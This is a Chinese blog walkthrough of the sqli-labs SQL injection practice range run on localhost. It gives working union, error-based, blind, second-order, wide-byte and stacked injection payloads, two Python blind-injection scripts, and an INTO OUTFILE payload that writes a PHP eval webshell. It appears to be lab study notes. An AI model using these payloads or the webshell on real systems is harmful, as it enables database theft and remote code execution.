+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>将第一关payload的单引号去掉即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-2/?id=-1%20union%20select%201,(select%20group_concat(TABLE_NAME)%20from%20information_schema.COLUMNS%20where%20TABLE_SCHEMA=%22security%22),user()--+</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630221707361.png" alt="image-20220630221707361"></p>
+<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>通过报错结果来看，多了一个）</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701204544840.png" alt="image-20220701204544840"></p>
+<p>使用<code>&#39;)</code>来闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-3/?id=1%27)%20and%201=1%20--+</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701204756050.png" alt="image-20220701204756050"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>修改paylaod即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-3/?id=-1%27)union%20select%201,(select%20group_concat(TABLE_NAME)%20from%20information_schema.COLUMNS%20where%20TABLE_SCHEMA=%22security%22),user()--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>单引号正常没反应，双引号报错</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701210203958.png" alt="image-20220701210203958"></p>
+<p>使用 <code>&quot;)</code>闭合</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701210311764.png" alt="image-20220701210311764"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-4/?id=-1%22)%20union%20select%201,(select%20group_concat(password)%20from%20security.users),3--+</span><br><span class="line"></span><br><span class="line">http://localhost/sqli/Less-4/?id=-1%22)%20union%20select%201,(select%20password%20from%20security.users%20limit%202,1),3--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>没有回显位，要使用报错注入了</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/sqli/Less-5/?id=3%27%20%20and%20updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--+">http://localhost/sqli/Less-5/?id=3%27%20%20and%20updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--+</a></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701212555931.png" alt="image-20220701212555931"></p>
+<p>替换paylaod即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-5/?id=3%27%20%20and%20updatexml(1,concat(0x7e,(select%20group_concat(password)%20from%20security.users),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701212732179.png" alt="image-20220701212732179"></p>
+<h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>双引号闭合即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-6/?id=3&quot;%20%20and%20updatexml(1,concat(0x7e,(select%20group_concat(password)%20from%20security.users),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>不显示具体报错信息了，甚至都找不到怎么闭合，看了源码才知道两个括号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27;)) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-7/?id=1%27))--+</span><br></pre></td></tr></table></figure>
+
+<p>提示使用outfile，我觉得用bool盲注也可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-7/?id=-1%27))union%20select%201,(select%20group_concat(password)%20from%20security.users),3%20into%20outfile%20%20%22C:\\wamp\\www\\result.txt%22--+</span><br></pre></td></tr></table></figure>
+
+<p>使用group_concat()函数确保前后查询列数一致</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701221621961.png" alt="image-20220701221621961"></p>
+<p>还可以写webshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-7/?id=-1%27))union%20select%201,%22%3C?php%20@eval($_GET[%27shell%27]);?%3E%22,3%20into%20outfile%20%20%22C:\\wamp\\www\\result.php%22--+</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701222105666.png" alt="image-20220701222105666"></p>
+<h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><p>没有任何报错信息，使用单引号闭合后仍然可以使用outfile函数写shell的方式利用。</p>
+<p>继续跟着提示来，使用Bool盲注技巧。</p>
+<p>先判断数据库名长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1%27%20and%20length(database())=7--+ 无查询结果</span><br><span class="line">http://localhost/sqli/Less-8/?id=1%27%20and%20length(database())=8--+ 正常</span><br></pre></td></tr></table></figure>
+
+<p>再使用substr和ascii函数判断数据库名第一位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1%27%20and%20(ascii(substr(database(),1,1))=114)--+ 无查询结果</span><br><span class="line">http://localhost/sqli/Less-8/?id=1%27%20and%20(ascii(substr(database(),1,1))=115)--+ 正常</span><br></pre></td></tr></table></figure>
+
+<p>可知数据库名第一位是<code>s</code>，以此类推。</p>
+<p>盲注利用起来过程十分繁琐，可以写一个脚本自动完成。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;http://localhost/sqli/Less-8/?id=1%27%20and%20length(database())=&#123;&#125;--+&quot;</span></span><br><span class="line">payload2 = <span class="string">&quot;http://localhost/sqli/Less-8/?id=1%27%20and%20(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)--+&quot;</span></span><br><span class="line"></span><br><span class="line">length =<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    res = requests.get(payload1.<span class="built_in">format</span>(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        length = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        res = requests.get(payload2.<span class="built_in">format</span>(i,j))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702160137864.png" alt="image-20220702160137864"></p>
+<p>一个很简陋的脚本，要想实现sqlmap那样完全自动化注入还是要下很大功夫的。</p>
+<h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>这一关无论输入什么页面都没变化，使用时间盲注技巧。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-9/?id=1%27and%20if(ascii(substr(database(),1,1))=115,%20sleep(5),%200)%20--+</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702162259287.png" alt="image-20220702162259287"></p>
+<p>响应时间大于五秒，可知数据库名第一个字符是<code>s</code></p>
+<p>编写脚本利用，使用<code>elapsed.total_seconds()</code>函数获取响应时间</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;http://localhost/sqli/Less-9/?id=1%27%20and%20if(length(user())=&#123;&#125;,sleep(1),0)--+&quot;</span></span><br><span class="line">payload = <span class="string">&quot;http://localhost/sqli/Less-9/?id=1%27and%20if(ascii(substr(user(),&#123;&#125;,1))=&#123;&#125;,%20sleep(1),%200)%20--+&quot;</span></span><br><span class="line"></span><br><span class="line">length = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    res =requests.get(payload1.<span class="built_in">format</span>(i))</span><br><span class="line">    <span class="keyword">if</span> res.elapsed.total_seconds()&gt;<span class="number">1</span>:</span><br><span class="line">        length = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        res = requests.get(payload.<span class="built_in">format</span>(i,j))</span><br><span class="line">        <span class="keyword">if</span> res.elapsed.total_seconds()&gt;<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702163713799.png" alt="image-20220702163713799"></p>
+<p>我的靶场搭建在本地，正常响应非常迅速，所以我将sleep时间设置为1秒。需要根据实际情况设置时间，否则会影响结果。</p>
+<h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>和Less-9一样的时间盲注，用双引号闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-10/?id=1%22and%20if(ascii(substr(database(),1,1))=115,%20sleep(5),%200)%20--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><p>Union注入，报错注入都可以解决，只不过为POST方法。测试流程，payload和GET方法没有区别。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702165038472.png" alt="image-20220702165038472"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702165447462.png" alt="image-20220702165447462"></p>
+<p>12-22的注入类型和前几关一样，只是方法为POST，在此不再赘述。</p>
+<h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><p>过滤了注释符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//filter the comments out so as to comments should not work</span></span><br><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-23/?id=1&#x27; and 1=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>查询语句就变成了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; and 1=&#x27;1&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>正常闭合</p>
+<p>union注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-23/?id=-1%27%20union%20select%201,(user()),%273</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702171546565.png" alt="image-20220702171546565"></p>
+<p>报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-23/?id=-1%27%20union%20select%201,(exp(~(select%20*%20from%20(select%20user())a))),%273</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702171947946.png" alt="image-20220702171947946"></p>
+<h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><p>登录接口用mysql_real_escape_string函数做了处理，引号等特殊符号都被转义了，没有利用方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line"></span><br><span class="line">   <span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">   <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;username:&#x27;</span>.<span class="variable">$username</span>.<span class="string">&quot; password:&quot;</span>.<span class="variable">$password</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">output：</span><br><span class="line">username:<span class="number">1</span>\<span class="string">&#x27;?\&quot;v\&#x27;b\&quot; password:`</span></span><br></pre></td></tr></table></figure>
+
+<p>问题出在pass_change.php里面</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$curr_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里直接从session中取到username，直接带入到sql语句中，并未有过滤。mysql_real_escape_string函数只是转义，插入到数据库中引号还是存在的。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702205809990.png" alt="image-20220702205809990"></p>
+<p>现在利用思路就有了：</p>
+<p>注册一个名为<code>admin&#39;#</code>的用户，进入修改密码界面，这时sql语句就会变成：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> PASSWORD<span class="operator">=</span><span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>#<span class="string">&#x27; and password=&#x27;</span>$curr_pass<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>即可实现修改admin用户的密码。</p>
+<p>注册用户</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702210909259.png" alt="image-20220702210909259"></p>
+<p>修改密码，原有的admin用户密码被修改了。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702210932182.png" alt="image-20220702210932182"></p>
+<p>二次注入和PHP代码审计结合很紧密。</p>
+<p>之后是各种过滤bypass关卡，本文重点总结sql注入类型，暂时不研究绕过了。</p>
+<h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><p>这一关将引号转义了</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702212849204.png" alt="image-20220702212849204"></p>
+<p>运用宽字节注入技巧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-32/?id=-1%df%27%20union%20select%201,user(),3--+</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702214201886.png" alt="image-20220702214201886"></p>
+<h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><p>源码中查询语句如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
+
+<p>此时可以使用堆叠注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-38/?id=1%27;select%20%22hack%20by%20luckyfuture%22%20into%20outfile%20%22C:\\wamp\\www\\hack.txt%22--+</span><br></pre></td></tr></table></figure>
+
+<p>成功执行</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702220447027.png" alt="image-20220702220447027"></p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="outfile函数写shell"><a href="#outfile函数写shell" class="headerlink" title="outfile函数写shell"></a>outfile函数写shell</h3><p>利用条件</p>
+<ul>
+<li>secure_file_priv值为空，web目录已知</li>
+</ul>
+<p><a href="#Less-7">见Less-7</a> </p>
+<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><ul>
+<li>过滤<code>&quot;</code>引号</li>
+</ul>
+<p>16进制编码绕过 ,比如这里”)的十六进制为0x2229 最终网站也给我们返回了正确的信息</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701211502623.png" alt="image-20220701211502623"></p>
+<ul>
+<li>过滤注释符</li>
+</ul>
+<p><a href="#Less-23">再打一个引号手动闭合，见Less-23</a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从接触信息安全开始，云了4年的SQL注入，面试遇到一顿扯，实战遇到sqlmap一把梭。今天终于动手把所有sql注入类型的原理利用方式复现了一遍。不能说完全透彻了，起码照着漏洞源代码，能判断是什么注入类型，能构造payload。</p>
+<p>关于sql注入的利用提权，以及绕过思路，我打算实战中遇到了再详细整理。关于<code>--os-shell</code>和UDF提权我之前写过一篇<a target="_blank" rel="noopener" href="https://github.com/luckyfuture0177/VULOnceMore/blob/main/%E6%88%98%E6%9C%AF%E6%8A%80%E5%B7%A7/SQL%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93.md">笔记</a>，当时理解的很肤浅，没有太大参考价值。</p>
+<p>以前面试前经常会找一些sql注入的文章来临时看看，当时感觉知识点很多，挺复杂的。但是自己动手复现起来其实并不难，难的是说服自己动手去做。</p>
+<blockquote>
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/hackedu/3407131">https://blog.51cto.com/hackedu/3407131</a></p>
+<p><a target="_blank" rel="noopener" href="https://ro0t.top/cn/SQL%E6%B3%A8%E5%85%A5/">https://ro0t.top/cn/SQL%E6%B3%A8%E5%85%A5/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/11610385.html">https://www.cnblogs.com/-qing-/p/11610385.html</a></p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">LuckyFuture</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://luckyfuture.top/sqli-summary.html">http://luckyfuture.top/sqli-summary.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/%E7%9F%A5%E8%AF%86%E5%85%B1%E4%BA%AB%E8%AE%B8%E5%8F%AF%E5%8D%8F%E8%AE%AE" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://luckyfuture.top" target="_blank">Lucky Future的技术栈</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630224530797.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/ssh-tunnel.html"><img class="prev-cover" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220805032000047.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">搭建SSH隧道绕过防火墙</div></div></a></div><div class="next-post pull-right"><a href="/HoleDigging.html"><img class="next-cover" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220628224540078.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SRC漏洞挖掘思路</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Waline</span><span class="switch-btn"></span><span class="second-comment">Disqusjs</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">SQL注入产生原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 